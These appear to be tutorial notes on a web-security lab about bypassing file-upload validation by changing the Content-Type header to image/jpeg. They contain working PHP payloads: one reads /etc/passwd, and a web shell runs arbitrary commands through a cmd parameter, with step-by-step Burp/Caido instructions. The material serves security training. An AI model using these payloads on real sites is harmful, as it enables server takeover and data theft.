## Exploiting flawed validation of file uploads

In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in the previous technique. But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

--- 

## Flawed file type validation

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-urlencoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

--- 

## Flawed file type validation - Continued

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:
```
POST /images HTTP/1.1 Host: normal-website.com 
Content-Length: 12345 
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
Content-Disposition: form-data; name="image"; filename="example.jpg" 
Content-Type: image/jpeg [...binary content of example.jpg...] 
---------------------------012345678901234567890123456 Content-Disposition: form-data; 
name="description" This is an interesting description of my image. 
---------------------------012345678901234567890123456 Content-Disposition: form-data; 
name="username" wiener 
---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

---

## Flawed file type validation - Continued

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater or caido replay.

---

## Process Steps:

- Log in and upload an image as your avatar, then go back to your account page.
- In Burp or caido, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
- On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
```PHP
    <?php echo file_get_contents('/etc/passwd'); ?>
```
- Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type `image/jpeg` or `image/png`.
- In Burp or caido, go back to the proxy history and find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater.
- In Burp Repeater or caido replay, go to the tab containing the `POST /my-account/avatar` request. In the part of the message body related to your file, change the specified `Content-Type` to `image/jpeg`.
- Send the request. Observe that the response indicates that your file was successfully uploaded.
- Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that command's output was returned in the response.

--- 

## In simple way...

1. At first login to the account -> then create a payload of that script (basic exploit) "<?php echo system($_GET['cmd']); ?>"
2. Then upload to the uploadable function ->  then that shows and error -> go to burpsuite or caido **http-history** There you can see the `POST` method where the file uploaded 
3. Send that to repeter and then just change the function to uploadable file like `image` or anything by changing the `x-php` function like the given image.
4. Then just go back to the website and check the avater image or image viewable function and click to open and execute that in other tab -> there you can see that your exploit name is appearing.
5. Now add `?cmd=ls` to test that is your function is working or not. if it is then just go back yo buirpsuite or caido and then go to `http-history` and find that `cmd=ls` **http-history** then send it to repeter or replay.
6. Then you can able to execute any type of arbitary command what you want. You got an access of that server.

--- 
